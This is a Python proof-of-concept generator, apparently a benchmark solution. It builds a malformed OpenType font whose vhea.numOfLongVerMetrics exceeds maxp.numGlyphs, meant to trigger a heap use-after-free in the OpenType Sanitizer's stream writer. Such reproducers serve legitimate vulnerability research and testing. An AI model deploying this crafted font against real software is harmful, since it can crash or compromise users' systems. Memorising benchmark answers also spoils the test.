import struct

class Solution:
    """
    Generates a Proof-of-Concept input that triggers a Heap Use After Free
    vulnerability in ots::OTSStream::Write.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a malformed OpenType font file.

        The vulnerability is triggered by an inconsistency between the `maxp` and `vhea`
        tables. Specifically, `vhea.numOfLongVerMetrics` is set to a value greater
        than `maxp.numGlyphs`. During the sanitization process, OTS attempts to
        serialize properties shared between the `vhea` and `vmtx` tables. The validation
        failure (`numOfLongVerMetrics > numGlyphs`) causes an internal shared stream
        object to be prematurely deallocated after processing the `vhea` table.
        When the sanitizer then proceeds to process the `vmtx` table, it attempts to
        write to this deallocated stream, resulting in a use-after-free.
        """
        num_glyphs = 1
        num_h_metrics = 1
        # The vulnerability trigger: numOfLongVerMetrics > numGlyphs
        num_v_metrics = 2

        # --- Table Definitions ---

        # 'head' table (Font Header)
        head_table = struct.pack(
            '>llLLHHqqhhhhHHHHH',
            0x00010000,  # version (1.0)
            0x00010000,  # fontRevision
            0,           # checkSumAdjustment
            0x5F0F3CF5,  # magicNumber
            0b0000000000001011, # flags
            1000,        # unitsPerEm
            0,           # created
            0,           # modified
            0,           # xMin
            0,           # yMin
            100,         # xMax
            100,         # yMax
            0,           # macStyle
            10,          # lowestRecPPEM
            2,           # fontDirectionHint
            0,           # indexToLocFormat
            0            # glyphDataFormat
        )

        # 'hhea' table (Horizontal Header)
        hhea_table = struct.pack(
            '>lhhhHhhhhhhhhhhhhH',
            0x00010000,  # version
            800,         # Ascender
            -200,        # Descender
            0,           # LineGap
            1000,        # advanceWidthMax
            0,           # minLeadingBearing
            0,           # minTrailingBearing
            100,         # xMaxExtent
            1,           # caretSlopeRise
            0,           # caretSlopeRun
            0,           # caretOffset
            0, 0, 0, 0,  # reserved
            0,           # metricDataFormat
            num_h_metrics # numberOfHMetrics
        )

        # 'maxp' table (Maximum Profile)
        maxp_table = struct.pack(
            '>L' + 'H' * 14,
            0x00010000,  # version 1.0
            num_glyphs,  # numGlyphs
            1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
        )

        # 'vhea' table (Vertical Header) - Contains the trigger
        vhea_table = struct.pack(
            '>lhhhHhhhhhhhhhhhhH',
            0x00010000,  # version
            800,         # vertTypoAscender
            -200,        # vertTypoDescender
            0,           # vertTypoLineGap
            1000,        # advanceHeightMax
            0,           # minTopSideBearing
            0,           # minBottomSideBearing
            100,         # yMaxExtent
            1,           # caretSlopeRise
            0,           # caretSlopeRun
            0,           # caretOffset
            0, 0, 0, 0,  # reserved
            0,           # metricDataFormat
            num_v_metrics # numOfLongVerMetrics -> VULNERABILITY TRIGGER
        )

        # 'vmtx' table (Vertical Metrics)
        vmtx_table = struct.pack('>Hh', 1000, 0)

        tables = {
            b'head': head_table,
            b'hhea': hhea_table,
            b'maxp': maxp_table,
            b'vhea': vhea_table,
            b'vmtx': vmtx_table,
        }

        # --- Font Assembly ---

        sorted_tags = sorted(tables.keys())
        num_tables = len(sorted_tags)

        # SFNT Header for 5 tables
        entry_selector = 2
        search_range = 64
        range_shift = 16

        header = struct.pack(
            '>LHHHH',
            0x00010000,
            num_tables,
            search_range,
            entry_selector,
            range_shift
        )

        directory = b''
        table_data = b''
        current_offset = 12 + num_tables * 16

        for tag in sorted_tags:
            data = tables[tag]
            length = len(data)
            
            directory += struct.pack('>4sLLL', tag, 0, current_offset, length)
            
            padded_data = data + b'\0' * (-(len(data)) % 4)
            table_data += padded_data
            current_offset += len(padded_data)

        return header + directory + table_data
